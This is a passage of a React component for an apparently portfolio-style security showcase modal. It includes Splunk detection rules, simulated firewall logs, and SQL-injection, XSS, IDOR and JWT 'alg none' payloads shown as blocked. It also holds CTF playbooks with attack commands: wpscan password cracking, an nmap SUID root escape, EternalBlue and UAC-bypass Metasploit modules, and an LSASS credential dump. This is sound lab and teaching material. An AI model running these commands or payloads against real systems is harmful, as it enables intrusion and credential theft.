"use client";

import React, { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  X,
  Play,
  Pause,
  RotateCcw,
  ShieldAlert,
  ShieldCheck,
  Terminal,
  Activity,
  Layers,
  Search,
  ExternalLink,
  Cpu,
  Server,
  Zap,
  CheckCircle2,
  AlertTriangle,
  ArrowRight,
  Database,
  Lock,
  Radio,
  Bug,
  Globe,
  Shield,
  Eye,
  Flame,
  Key,
  ChevronRight,
  FileCode,
  Check,
} from "lucide-react";
import { GithubIcon, TryhackmeIcon } from "./SocialIcons";
import Project3DVisualizer from "./Project3DVisualizer";
import Isometric3DNetworkVisualizer from "./Isometric3DNetworkVisualizer";

export default function ProjectInteractiveShowcaseModal({ project, onClose }) {
  if (!project) return null;

  // State machine based on which project is selected
  const [activeTab, setActiveTab] = useState("simulator"); // 'simulator' | 'architecture' | 'reports'

  // --- Splunk SOC Lab State ---
  const [selectedRule, setSelectedRule] = useState("T1110");
  const [simulatingLog, setSimulatingLog] = useState(false);
  const [socAlerts, setSocAlerts] = useState([
    {
      id: "ALT-901",
      time: "14:22:05",
      type: "T1110 - Brute Force",
      src: "198.51.100.45",
      sev: "HIGH",
      msg: ">=5 failed console logins in 5m (admin)",
    },
    {
      id: "ALT-902",
      time: "14:22:18",
      type: "T1078 - Valid Accounts",
      src: "203.0.113.88",
      sev: "CRITICAL",
      msg: "Root login without MFA token challenge",
    },
  ]);

  const splunkRules = {
    T1110: {
      name: "T1110 - Brute Force Console Logins",
      severity: "HIGH",
      spl: `index=aws_cloudtrail eventName=ConsoleLogin "errorMessage=Failed authentication"
| bin _time span=5m
| stats count as failed_attempts by sourceIPAddress
| where failed_attempts >= 5
| eval alert_severity="HIGH"`,
      sampleTrigger: {
        id: "ALT-903",
        time: new Date().toLocaleTimeString(),
        type: "T1110 - Brute Force",
        src: "198.51.100.77",
        sev: "HIGH",
        msg: "Bursts of 7 failed logins detected against account 'finance-dev'",
      },
    },
    T1078: {
      name: "T1078 - Root Login Without MFA",
      severity: "CRITICAL",
      spl: `index=aws_cloudtrail eventName=ConsoleLogin "responseElements.ConsoleLogin=Success"
| where 'additionalEventData.MFAUsed'="No" OR 'userIdentity.type'="Root"
| eval alert_severity=if('userIdentity.type'=="Root", "CRITICAL", "MEDIUM")`,
      sampleTrigger: {
        id: "ALT-904",
        time: new Date().toLocaleTimeString(),
        type: "T1078 - Valid Accounts",
        src: "203.0.113.88",
        sev: "CRITICAL",
        msg: "Root interactive console login without hardware MFA token",
      },
    },
    T1098: {
      name: "T1098 - Account Manipulation (AdminAccess)",
      severity: "CRITICAL",
      spl: `index=aws_cloudtrail eventName IN ("AttachUserPolicy", "PutUserPolicy")
| search requestParameters.policyArn="*AdministratorAccess*"
| table _time, userIdentity.arn, requestParameters.userName, sourceIPAddress`,
      sampleTrigger: {
        id: "ALT-905",
        time: new Date().toLocaleTimeString(),
        type: "T1098 - Account Manipulation",
        src: "198.51.100.45",
        sev: "CRITICAL",
        msg: "AdministratorAccess policy attached to user 'dev_intern'",
      },
    },
    T1530: {
      name: "T1530 - S3 Public Exposure Alert",
      severity: "HIGH",
      spl: `index=aws_cloudtrail eventName IN ("PutBucketAcl", "DeleteBucketPublicAccessBlock")
| search requestParameters.PublicAccessBlockConfiguration.BlockPublicAcls=false
| eval alert_severity="HIGH"`,
      sampleTrigger: {
        id: "ALT-906",
        time: new Date().toLocaleTimeString(),
        type: "T1530 - S3 Exposure",
        src: "198.51.100.12",
        sev: "HIGH",
        msg: "S3 Public Access Block removed from 'corp-financial-archive'",
      },
    },
    T1046: {
      name: "T1046 - Network Port Sweep via VPC Flow Logs",
      severity: "MEDIUM",
      spl: `index=aws_vpc_flow action=REJECT
| bin _time span=10m
| stats dc(dest_port) as distinct_ports by src_ip, dest_ip
| where distinct_ports >= 25`,
      sampleTrigger: {
        id: "ALT-907",
        time: new Date().toLocaleTimeString(),
        type: "T1046 - Port Sweep",
        src: "45.33.32.156",
        sev: "MEDIUM",
        msg: "Probe across 42 blocked destination ports in 5 minutes",
      },
    },
  };

  const handleSimulateSocAttack = () => {
    setSimulatingLog(true);
    setTimeout(() => {
      const trigger = splunkRules[selectedRule]?.sampleTrigger;
      if (trigger) {
        setSocAlerts((prev) => [trigger, ...prev.slice(0, 4)]);
      }
      setSimulatingLog(false);
    }, 900);
  };

  // --- Firewall State ---
  const [fwTestScenario, setFwTestScenario] = useState("syn_flood");
  const [fwLog, setFwLog] = useState(
    "%ASA-4-106023: Deny tcp src OUTSIDE:198.51.100.45/54312 dst INSIDE-DMZ:192.168.10.5/80 by access-group 'OUTSIDE_IN' [0x0]"
  );

  const fwScenarios = {
    syn_flood: {
      title: "WAN Ingress SYN Flood (hping3)",
      ingress: "OUTSIDE (Sec 0)",
      target: "Gateway VIP",
      result: "BLOCKED (SYN Cookie Rate-Limit)",
      log: "%ASA-4-106023: Deny tcp src OUTSIDE:203.0.113.45/49210 dst VIP:203.0.113.1/443 by access-group 'OUTSIDE_IN' [Embryonic limit reached: dropped]",
    },
    lateral_pivot: {
      title: "DMZ-to-Internal Lateral SSH Pivot",
      ingress: "DMZ (Sec 50)",
      target: "CORP-INTERNAL (Sec 100)",
      result: "BLOCKED (Zone Security Level Drop)",
      log: "%ASA-4-106023: Deny tcp src INSIDE-DMZ:192.168.10.15/44120 dst INSIDE-CORP:10.100.1.50/22 by access-group 'DMZ_IN' [Deny-by-default]",
    },
    anti_spoof: {
      title: "Spoofed RFC1918 Packet from Public Internet",
      ingress: "OUTSIDE (Sec 0)",
      target: "CORP-INTERNAL",
      result: "BLOCKED (Interface Anti-Spoofing Filter)",
      log: "%CHECKPOINT-FW1: Anti-Spoofing drop on interface eth0: packet with RFC1918 source 10.100.0.99 discarded",
    },
    cleartext_telnet: {
      title: "Unencrypted Telnet Probe",
      ingress: "OUTSIDE (Sec 0)",
      target: "HQ Core Gateway",
      result: "BLOCKED (Policy Auditor Enforced Drop)",
      log: "%ASA-2-106001: Deny inbound tcp src OUTSIDE:198.51.100.12/38912 dst VIP:203.0.113.1/23 by access-group 'OUTSIDE_IN'",
    },
  };

  // --- C++ Packet Analyzer State ---
  const [benchRunning, setBenchRunning] = useState(false);
  const [benchStats, setBenchStats] = useState({
    packets: 100000,
    pps: 542888,
    mbps: 318.78,
    tcp: 75000,
    udp: 25000,
    icmp: 0,
    time: 0.184,
  });

  const runBenchmark = () => {
    setBenchRunning(true);
    setBenchStats({ packets: 0, pps: 0, mbps: 0, tcp: 0, udp: 0, icmp: 0, time: 0 });
    let p = 0;
    const interval = setInterval(() => {
      p += 12500;
      if (p >= 100000) {
        p = 100000;
        clearInterval(interval);
        setBenchRunning(false);
        setBenchStats({
          packets: 100000,
          pps: 542888,
          mbps: 318.78,
          tcp: 75000,
          udp: 25000,
          icmp: 0,
          time: 0.184,
        });
      } else {
        setBenchStats({
          packets: p,
          pps: Math.round(p / 0.184),
          mbps: Math.round((p * 64 * 8) / (0.184 * 1000000)),
          tcp: Math.round(p * 0.75),
          udp: Math.round(p * 0.25),
          icmp: 0,
          time: 0.184,
        });
      }
    }, 60);
  };

  // --- WireMCP Forensics & Dissector State ---
  const [wireMcpMode, setWireMcpMode] = useState("benchmark"); // 'benchmark' | 'dissection' | 'ioc_threat'
  const [wireMcpScanning, setWireMcpScanning] = useState(false);
  const [wireMcpSelectedIp, setWireMcpSelectedIp] = useState("8.8.8.8");
  const [wireMcpThreatResult, setWireMcpThreatResult] = useState({
    ip: "8.8.8.8",
    verdict: "CLEAN (URLhaus IOC Verified)",
    details: "Google Anycast DNS Node. Zero hits across 450k active URLhaus malicious endpoints.",
    confidence: "100%",
    statusColor: "text-emerald-400 bg-emerald-500/10 border-emerald-500/30",
  });

  const wireMcpSamplePackets = [
    {
      frame: 1,
      time: "0.000000",
      src: "192.168.1.100",
      dst: "8.8.8.8",
      proto: "UDP/DNS",
      len: 74,
      info: "Standard query 0x1a2b A api.cloudflare.com",
      layers: {
        ethernet: "00:1a:2b:3c:4d:5e -> 50:06:04:88:99:aa [IPv4]",
        ip: "Src: 192.168.1.100, Dst: 8.8.8.8, TTL: 64, Proto: UDP (17)",
        udp: "Src Port: 49153, Dst Port: 53, Length: 40",
        dns: "Flags: 0x0100 (Standard query), Queries: api.cloudflare.com",
      },
    },
    {
      frame: 2,
      time: "0.004120",
      src: "192.168.1.100",
      dst: "192.168.1.1",
      proto: "TCP/TLS",
      len: 583,
      info: "Client Hello, TLS 1.3, SNI: gateway.corp.internal",
      layers: {
        ethernet: "00:1a:2b:3c:4d:5e -> c0:25:e9:11:22:33 [IPv4]",
        ip: "Src: 192.168.1.100, Dst: 192.168.1.1, TTL: 128, Proto: TCP (6)",
        tcp: "Src Port: 1234, Dst Port: 443, Seq: 1, Ack: 1, Flags: [PSH, ACK]",
        tls: "Handshake Protocol: Client Hello (v1.3), CipherSuites: TLS_AES_256_GCM_SHA384",
      },
    },
    {
      frame: 3,
      time: "0.008910",
      src: "192.168.1.100",
      dst: "192.168.1.1",
      proto: "TCP",
      len: 66,
      info: "1234 -> 443 [ACK] Seq=518 Ack=1461 Win=65535",
      layers: {
        ethernet: "00:1a:2b:3c:4d:5e -> c0:25:e9:11:22:33 [IPv4]",
        ip: "Src: 192.168.1.100, Dst: 192.168.1.1, TTL: 128, Proto: TCP (6)",
        tcp: "Src Port: 1234, Dst Port: 443, Flags: [ACK], Window size: 65535",
        payload: "Zero-length ACK packet for flow control",
      },
    },
    {
      frame: 4,
      time: "0.012350",
      src: "103.145.13.208",
      dst: "192.168.1.100",
      proto: "TCP/SYN",
      len: 60,
      info: "Inbound malicious probe on Port 445 [SYN-SCAN]",
      layers: {
        ethernet: "fa:16:3e:aa:bb:cc -> 00:1a:2b:3c:4d:5e [IPv4]",
        ip: "Src: 103.145.13.208, Dst: 192.168.1.100, TTL: 48, Proto: TCP (6)",
        tcp: "Src Port: 58821, Dst Port: 445 (SMB), Flags: [SYN], MSS=1460",
        threat: "IOC Match: IP listed on URLhaus active malware botnet list!",
      },
    },
  ];

  const [selectedWireFrame, setSelectedWireFrame] = useState(wireMcpSamplePackets[0]);

  const handleScanWireMcpThreat = (targetIp) => {
    setWireMcpSelectedIp(targetIp);
    setWireMcpScanning(true);
    setTimeout(() => {
      if (targetIp === "103.145.13.208") {
        setWireMcpThreatResult({
          ip: "103.145.13.208",
          verdict: "MALICIOUS (THREAT DETECTED)",
          details: "URLhaus IOC Blacklist match: Active Mirai / Mozi C2 node detected in wiremcp check_threats scan.",
          confidence: "99.4%",
          statusColor: "text-red-400 bg-red-500/10 border-red-500/30",
        });
      } else if (targetIp === "8.8.8.8") {
        setWireMcpThreatResult({
          ip: "8.8.8.8",
          verdict: "CLEAN (URLhaus IOC Verified)",
          details: "Google Anycast DNS Node. Zero hits across 450k active URLhaus malicious endpoints.",
          confidence: "100%",
          statusColor: "text-emerald-400 bg-emerald-500/10 border-emerald-500/30",
        });
      } else {
        setWireMcpThreatResult({
          ip: targetIp,
          verdict: "CLEAN (INTERNAL GATEWAY)",
          details: "RFC1918 Private Subnet Gateway. Not listed in URLhaus public threat feed.",
          confidence: "100%",
          statusColor: "text-cyan-400 bg-cyan-500/10 border-cyan-500/30",
        });
      }
      setWireMcpScanning(false);
    }, 600);
  };

  // --- Finance Pentesting State ---
  const [financeTesting, setFinanceTesting] = useState(false);

  // --- Salary Prediction ML State ---
  const [mlAge, setMlAge] = useState(28);
  const [mlWorkclass, setMlWorkclass] = useState("Private");
  const [mlEducation, setMlEducation] = useState("Bachelors");
  const [mlHours, setMlHours] = useState(45);
  const [mlResult, setMlResult] = useState("> $50,000 / year (Probability: 84.6%)");

  const handlePredictSalary = () => {
    const prob = (mlAge > 25 ? 0.3 : 0.1) + (mlEducation === "Masters" || mlEducation === "Bachelors" ? 0.4 : 0.15) + (mlHours >= 40 ? 0.2 : 0.05);
    const isHigh = prob > 0.5;
    setMlResult(
      isHigh
        ? `> $50,000 / year (Estimated Probability: ${(prob * 100).toFixed(1)}%)`
        : `<= $50,000 / year (Estimated Probability: ${((1 - prob) * 100).toFixed(1)}%)`
    );
  };

  // --- Finance OWASP Pentesting State ---
  const [financeAttack, setFinanceAttack] = useState("sqli");
  const financeScenarios = {
    sqli: {
      title: "SQL Injection (' OR 1=1--)",
      endpoint: "POST /api/v1/auth/login",
      payload: '{ "username": "admin\' OR \'1\'=\'1", "password": "pass" }',
      defense: "Cloudflare WAF + JPA Parameterized Statement",
      status: "401 UNAUTHORIZED (NEUTRALIZED)",
      statusColor: "text-emerald-400 bg-emerald-500/10 border-emerald-500/30",
      log: "[WAF-SHIELD] Ingress payload contains SQL meta-characters: \"' OR '1'='1\"\n[SPRING-SEC] JPA Prepared Statement: SELECT u FROM User u WHERE u.username = ?\n[AUTH-DENIED] No account matched literal username: injection neutralized (0 rows returned)",
    },
    xss: {
      title: "Stored XSS (<script>alert(1)</script>)",
      endpoint: "POST /api/v1/transactions/note",
      payload: '{ "memo": "Payment for <script>alert(document.cookie)</script>" }',
      defense: "DOMPurify + HttpOnly Secure Cookies + Strict CSP",
      status: "200 SANITIZED",
      statusColor: "text-cyan-400 bg-cyan-500/10 border-cyan-500/30",
      log: "[INPUT-FILTER] HTML sanitizer intercepted dangerous script tag in memo\n[DOM-PURIFY] Sanitized output: \"Payment for alert(document.cookie)\"\n[BROWSER-CSP] Content-Security-Policy: default-src 'self' prevents inline execution\n[COOKIE-FLAG] Auth session token protected with HttpOnly: cookie theft impossible",
    },
    bola: {
      title: "BOLA / IDOR Account Snooping",
      endpoint: "GET /api/v1/accounts/9941/balance",
      payload: "Authorization: Bearer <user_id: 1402>",
      defense: "Spring @PreAuthorize + Ownership Validator",
      status: "403 FORBIDDEN (INTERCEPTED)",
      statusColor: "text-red-400 bg-red-500/10 border-red-500/30",
      log: "[JWT-FILTER] Valid token for user_id=1402 (ROLE_CUSTOMER)\n[OWNERSHIP-CHECK] Account 9941 is assigned to user_id=8831 != 1402\n[SEC-AUDIT] Unauthorized cross-tenant BOLA traversal flagged -> Access denied (403)",
    },
    jwt_tamper: {
      title: "JWT Algorithm Confusion ('alg': 'none')",
      endpoint: "POST /api/v1/admin/transfer",
      payload: 'Header: {"alg":"none"}.Payload: {"sub":"parth","role":"ROLE_SUPERADMIN"}',
      defense: "Strict HMAC-SHA256 Signature Verification",
      status: "401 INVALID SIGNATURE",
      statusColor: "text-amber-400 bg-amber-500/10 border-amber-500/30",
      log: "[JWT-PARSER] Token algorithm 'none' rejected by strict JwtParserBuilder\n[CRYPTO-CHECK] Expected JWS with HMAC-SHA256 signature\n[AUDIT-LOG] Malicious token forgery attempt recorded from 198.51.100.82",
    },
  };

  // --- CyberLab / CTF Terminal State ---
  const [ctfRoom, setCtfRoom] = useState("mr_robot");
  const [ctfStep, setCtfStep] = useState(0);
  const ctfPlaybooks = {
    mr_robot: {
      title: "Mr. Robot CTF — Dictionary Pruning & SUID Escapes",
      target: "10.10.114.88 (Linux)",
      steps: [
        {
          cmd: "nmap -sC -sV -p 80,443 10.10.114.88",
          output: "PORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd\n443/tcp open ssl/http Apache httpd\n|_robots.txt: 2 entries: key-1-of-3.txt, fsocity.dic",
          note: "Robots.txt reveals first key and raw 858,160-word dictionary fsocity.dic",
        },
        {
          cmd: "wc -l fsocity.dic && sort -u fsocity.dic | wc -l",
          output: "858160 fsocity.dic\n43221 fsocity_sorted.dic\n[*] Tool Freeze Fixed: Reduced wordlist by 95% via deduplication!",
          note: "Hydra / WPScan were freezing on 850k words. Pruning via sort -u fixed it in 3 seconds.",
        },
        {
          cmd: "wpscan --url http://10.10.114.88 --passwords fsocity_sorted.dic -U elliot",
          output: "[+] Valid credentials found: elliot:ER28-0652\n[+] WordPress admin portal compromised!",
          note: "Authenticated access achieved to WordPress wp-admin.",
        },
        {
          cmd: "find / -perm -u=s -type f 2>/dev/null",
          output: "/usr/local/bin/nmap\n[!] SUID binary detected: nmap version 3.81!\n$ nmap --interactive\nnmap> !sh\n# whoami\nroot\n# cat /root/key-3-of-3.txt\n04a54d6f3093514da260109f30c82f01",
          note: "Nmap interactive mode shell breakout yields full root privileges and final flag!",
        },
      ],
    },
    eternal_blue: {
      title: "Blue (MS17-010) — SMBv1 Remote Kernel Buffer Overflow",
      target: "10.10.220.45 (Windows 7 Pro)",
      steps: [
        {
          cmd: "nmap -sC -sV -p 445 --script vuln 10.10.220.45",
          output: "445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1\n| smb-vuln-ms17-010:\n|   VULNERABLE: Remote Code Execution in Microsoft SMBv1\n|   Risk factor: HIGH",
          note: "Confirmed vulnerable to EternalBlue kernel pool corruption.",
        },
        {
          cmd: "use exploit/windows/smb/ms17_010_eternalblue && run",
          output: "[*] Connecting to 10.10.220.45:445...\n[*] Target OS: Windows 7 Professional 7601 Service Pack 1\n[+] Built-in groom packets sent (pool spray success)\n[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.220.45:49158)",
          note: "Kernel exploit successful; Meterpreter stage delivered.",
        },
        {
          cmd: "migrate -N spoolsv.exe && getuid",
          output: "[*] Migrating from unstable x64 payload to spoolsv.exe (PID 1320)...\n[+] Migration successful!\nServer username: NT AUTHORITY\\SYSTEM",
          note: "Prevents blue-screen kernel crash and locks permanent SYSTEM persistence.",
        },
      ],
    },
    icecast: {
      title: "Ice (CVE-2014-0759) — UAC Bypass & LSASS Credential Dump",
      target: "10.10.198.12 (Windows 10)",
      steps: [
        {
          cmd: "use exploit/windows/http/icecast_header && set RHOSTS 10.10.198.12 && run",
          output: "[*] Sending Icecast HTTP buffer overflow payload...\n[+] Meterpreter session 1 opened as Dark-PC\\Dark",
          note: "Initial unprivileged user shell obtained via CVE-2014-0759.",
        },
        {
          cmd: "use post/windows/gather/win_privs",
          output: "[*] Current user: Dark-PC\\Dark\n[!] UAC is enabled on this system.",
          note: "Standard privileges cannot read LSASS memory. UAC bypass required.",
        },
        {
          cmd: "use exploit/windows/local/bypassuac_eventvwr && run",
          output: "[*] Hijacking eventvwr.exe registry entry...\n[+] Spawned elevated Meterpreter session 2!\n# load kiwi && creds_all\n[+] NTLM Hashes extracted from LSASS memory for Administrator",
          note: "Kiwi (Mimikatz) successfully dumps plaintext and NTLM credentials from LSASS.",
        },
      ],
    },
  };

  // --- Yoga AI Biomechanical State ---
  const [yogaPose, setYogaPose] = useState("warrior");
  const yogaScenarios = {
    warrior: {
      name: "Warrior II (Virabhadrasana II)",
      kneeAngle: "88° (Optimal: 90° ± 5°)",
      spineAlign: "Vertical (0.97 confidence)",
      armSpan: "178° (Horizontal alignment verified)",
      status: "EXCELLENT POSTURE (Score: 96/100)",
      statusColor: "text-emerald-400 bg-emerald-500/10 border-emerald-500/30",
      feedback: "Maintain knee over ankle. Gemini AI feedback: Great torso stability; relax shoulders slightly.",
    },
    tree: {
      name: "Tree Pose (Vrikshasana)",
      kneeAngle: "124° (Hip abduction open)",
      spineAlign: "Centered vertical balance",
      armSpan: "Hands in Anjali Mudra",
      status: "STABLE ALIGNMENT (Score: 92/100)",
      statusColor: "text-cyan-400 bg-cyan-500/10 border-cyan-500/30",
      feedback: "Foot placed correctly on inner thigh (avoiding knee joint). Balance duration: 42s.",
    },
  };

  // Detect project type
  const isSplunk = project.title.toLowerCase().includes("splunk") || project.title.toLowerCase().includes("soc");
  const isSocLab = isSplunk;
  const isFirewall = project.title.toLowerCase().includes("firewall");
  const isPacket = project.title.toLowerCase().includes("packet");
  const isSalary = project.title.toLowerCase().includes("salary");
  const isCyberlab = project.title.toLowerCase().includes("cyberlab") || project.title.toLowerCase().includes("vulnerability");
  const isConfessions = project.title.toLowerCase().includes("confessions") || project.title.toLowerCase().includes("practitioner");
  const isFinance = project.title.toLowerCase().includes("finance") || project.title.toLowerCase().includes("spring");
  const isYoga = project.title.toLowerCase().includes("yoga");

  let project3dType = "firewall";
  if (isSplunk) project3dType = "splunk";
  else if (isPacket) project3dType = "packet";
  else if (isFirewall) project3dType = "firewall";
  else if (isFinance) project3dType = "finance";
  else if (isCyberlab || isConfessions || project.title.toLowerCase().includes("tryhackme")) project3dType = "cyberlab";

  return (
    <AnimatePresence>
      <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-6 overflow-y-auto bg-black/80 backdrop-blur-md">
        <motion.div
          initial={{ opacity: 0, scale: 0.95, y: 20 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.95, y: 20 }}
          className="relative w-full max-w-4xl bg-slate-900 border border-slate-700/80 rounded-2xl shadow-2xl overflow-hidden my-auto max-h-[92vh] flex flex-col"
        >
          {/* Header */}
          <div className="flex items-center justify-between p-5 border-b border-slate-800 bg-slate-950/70">
            <div className="flex items-center gap-3">
              <div className="p-2.5 rounded-xl bg-emerald-500/10 border border-emerald-500/20 text-emerald-400">
                <Cpu size={22} />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <span className="text-[11px] font-mono uppercase tracking-wider text-emerald-400 font-bold">
                    Interactive Live Architecture &amp; Telemetry
                  </span>
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                </div>
                <h2 className="text-lg sm:text-xl font-bold text-slate-100">{project.title}</h2>
              </div>
            </div>
            <button
              onClick={onClose}
              className="p-2 text-slate-400 hover:text-white rounded-lg hover:bg-slate-800 transition-colors"
            >
              <X size={20} />
            </button>
          </div>

          {/* Navigation Tabs */}
          <div className="flex border-b border-slate-800 bg-slate-900/60 px-5 gap-4">
            <button
              onClick={() => setActiveTab("simulator")}
              className={`py-3 text-xs sm:text-sm font-mono font-medium border-b-2 transition-all flex items-center gap-1.5 ${
                activeTab === "simulator"
                  ? "border-emerald-400 text-emerald-400"
                  : "border-transparent text-slate-400 hover:text-slate-200"
              }`}
            >
              <Play size={14} /> Interactive Live Simulator
            </button>
            <button
              onClick={() => setActiveTab("architecture")}
              className={`py-3 text-xs sm:text-sm font-mono font-medium border-b-2 transition-all flex items-center gap-1.5 ${
                activeTab === "architecture"
                  ? "border-emerald-400 text-emerald-400"
                  : "border-transparent text-slate-400 hover:text-slate-200"
              }`}
            >
              <Layers size={14} /> System Architecture
            </button>
          </div>

          {/* Modal Body */}
          <div className="p-5 overflow-y-auto space-y-6 flex-1 text-slate-300 text-sm">
            {activeTab === "simulator" ? (
              <div>
                {/* 1. SPLUNK SOC LAB SIMULATOR */}
                {isSocLab && (
                  <div className="space-y-5">
                    <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-3">
                      <div className="flex flex-wrap items-center justify-between gap-2">
                        <span className="text-xs font-mono text-cyan-400 font-bold flex items-center gap-1">
                          <Search size={14} /> Select MITRE ATT&amp;CK Detection Query:
                        </span>
                        <button
                          onClick={handleSimulateSocAttack}
                          disabled={simulatingLog}
                          className="px-3 py-1.5 rounded-lg bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 hover:bg-emerald-500/30 font-mono text-xs font-bold transition-all flex items-center gap-1.5"
                        >
                          <Zap size={13} className={simulatingLog ? "animate-spin" : ""} />
                          {simulatingLog ? "Injecting Attack Log..." : "Simulate Cloud Attack →"}
                        </button>
                      </div>

                      <div className="flex flex-wrap gap-2">
                        {Object.keys(splunkRules).map((tech) => (
                          <button
                            key={tech}
                            onClick={() => setSelectedRule(tech)}
                            className={`px-2.5 py-1 rounded-md text-xs font-mono border transition-all ${
                              selectedRule === tech
                                ? "bg-cyan-500/20 text-cyan-300 border-cyan-400 font-bold"
                                : "bg-slate-800/40 text-slate-400 border-slate-700 hover:text-slate-200"
                            }`}
                          >
                            {tech}
                          </button>
                        ))}
                      </div>

                      {/* SPL Query Display */}
                      <div className="p-3 bg-black/60 rounded-lg border border-slate-800/80 font-mono text-xs text-emerald-400 overflow-x-auto whitespace-pre">
                        {splunkRules[selectedRule].spl}
                      </div>
                    </div>

                    {/* Live SOC Incident Queue */}
                    <div>
                      <div className="flex items-center justify-between mb-2">
                        <h4 className="text-xs font-mono uppercase tracking-wider text-slate-400 font-bold flex items-center gap-1.5">
                          <ShieldAlert size={14} className="text-red-400" />
                          Live Splunk Incident Alert Stream
                        </h4>
                        <span className="text-[11px] font-mono text-slate-500">Auto-Refreshed via CloudTrail Hook</span>
                      </div>

                      <div className="space-y-2">
                        {socAlerts.map((alt) => (
                          <div
                            key={alt.id}
                            className="p-3 rounded-lg bg-slate-950/70 border border-slate-800 flex items-center justify-between gap-3 text-xs font-mono"
                          >
                            <div className="flex items-center gap-2.5">
                              <span
                                className={`px-2 py-0.5 rounded font-bold ${
                                  alt.sev === "CRITICAL"
                                    ? "bg-red-500/20 text-red-400 border border-red-500/30"
                                    : "bg-amber-500/20 text-amber-400 border border-amber-500/30"
                                }`}
                              >
                                {alt.sev}
                              </span>
                              <span className="text-slate-300 font-semibold">{alt.type}</span>
                              <span className="text-slate-500">[{alt.src}]</span>
                            </div>
                            <span className="text-slate-400 text-[11px] truncate hidden sm:inline">{alt.msg}</span>
                            <span className="text-slate-500 text-[11px]">{alt.time}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  </div>
                )}

                {/* 2. ENTERPRISE FIREWALL SIMULATOR */}
                {isFirewall && (
                  <div className="space-y-5">
                    {/* Visual 3D Zone Topology Map */}
                    <div className="p-4 bg-slate-950 rounded-xl border border-slate-800 text-center">
                      <p className="text-xs font-mono text-slate-400 mb-3 uppercase tracking-wider">
                        Interactive Perimeter &amp; Zone Isolation Grid (GNS3 Model)
                      </p>
                      <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs font-mono">
                        <div className="p-3 bg-red-500/10 border border-red-500/30 rounded-xl">
                          <p className="text-red-400 font-bold mb-1">OUTSIDE (WAN)</p>
                          <p className="text-[11px] text-slate-400">Security Level: 0</p>
                          <p className="text-[10px] text-slate-500 mt-1">Untrusted Public Transit</p>
                        </div>
                        <div className="p-3 bg-amber-500/10 border border-amber-500/30 rounded-xl">
                          <p className="text-amber-400 font-bold mb-1">DMZ SUBNET</p>
                          <p className="text-[11px] text-slate-400">Security Level: 50</p>
                          <p className="text-[10px] text-slate-500 mt-1">Web Proxies / Bastions</p>
                        </div>
                        <div className="p-3 bg-emerald-500/10 border border-emerald-500/30 rounded-xl">
                          <p className="text-emerald-400 font-bold mb-1">CORP-INTERNAL</p>
                          <p className="text-[11px] text-slate-400">Security Level: 100</p>
                          <p className="text-[10px] text-slate-500 mt-1">Databases &amp; User LAN</p>
                        </div>
                      </div>
                    </div>

                    {/* Attack Simulation Buttons */}
                    <div>
                      <p className="text-xs font-mono text-slate-400 mb-2 font-bold">Select Adversary Attack Vector:</p>
                      <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                        {Object.keys(fwScenarios).map((key) => (
                          <button
                            key={key}
                            onClick={() => {
                              setFwTestScenario(key);
                              setFwLog(fwScenarios[key].log);
                            }}
                            className={`p-2 rounded-lg border text-xs font-mono transition-all text-left ${
                              fwTestScenario === key
                                ? "bg-orange-500/20 text-orange-300 border-orange-500/50 font-bold"
                                : "bg-slate-950 text-slate-400 border-slate-800 hover:text-slate-200"
                            }`}
                          >
                            {fwScenarios[key].title}
                          </button>
                        ))}
                      </div>
                    </div>

                    {/* Firewall Telemetry & Syslog Console */}
                    <div className="p-3.5 bg-black/80 rounded-xl border border-slate-800 space-y-2">
                      <div className="flex items-center justify-between text-xs font-mono">
                        <span className="text-emerald-400 font-bold flex items-center gap-1.5">
                          <ShieldCheck size={14} /> Zero-Trust Result: {fwScenarios[fwTestScenario].result}
                        </span>
                        <span className="text-slate-500">Cisco ASA / Check Point Syslog</span>
                      </div>
                      <div className="p-3 bg-slate-950 rounded border border-slate-800/80 font-mono text-[11px] text-amber-300 overflow-x-auto whitespace-pre">
                        {fwLog}
                      </div>
                    </div>
                  </div>
                )}

                {/* 3. C++ PACKET ANALYZER & WIREMCP FORENSICS */}
                {isPacket && (
                  <div className="space-y-4">
                    {/* Sub-modes for Packet Analyzer: Benchmark vs WireMCP Dissection vs Threat Intel */}
                    <div className="flex flex-wrap items-center justify-between gap-2 p-1.5 bg-slate-950 rounded-xl border border-slate-800">
                      <div className="flex gap-1">
                        <button
                          onClick={() => setWireMcpMode("benchmark")}
                          className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all flex items-center gap-1.5 ${
                            wireMcpMode === "benchmark"
                              ? "bg-amber-500/20 text-amber-300 border border-amber-500/40"
                              : "text-slate-400 hover:text-slate-200"
                          }`}
                        >
                          <Zap size={13} /> 100k Replay Benchmark
                        </button>
                        <button
                          onClick={() => setWireMcpMode("dissection")}
                          className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all flex items-center gap-1.5 ${
                            wireMcpMode === "dissection"
                              ? "bg-cyan-500/20 text-cyan-300 border border-cyan-500/40"
                              : "text-slate-400 hover:text-slate-200"
                          }`}
                        >
                          <FileCode size={13} /> WireMCP Deep Dissector
                        </button>
                        <button
                          onClick={() => setWireMcpMode("ioc_threat")}
                          className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all flex items-center gap-1.5 ${
                            wireMcpMode === "ioc_threat"
                              ? "bg-red-500/20 text-red-300 border border-red-500/40"
                              : "text-slate-400 hover:text-slate-200"
                          }`}
                        >
                          <Bug size={13} /> WireMCP URLhaus IOCs
                        </button>
                      </div>
                      <span className="text-[10px] font-mono text-emerald-400 px-2 py-0.5 rounded bg-emerald-500/10 border border-emerald-500/20 hidden sm:inline">
                        WireMCP Engine Active
                      </span>
                    </div>

                    {/* Mode 1: Benchmark */}
                    {wireMcpMode === "benchmark" && (
                      <div className="space-y-4">
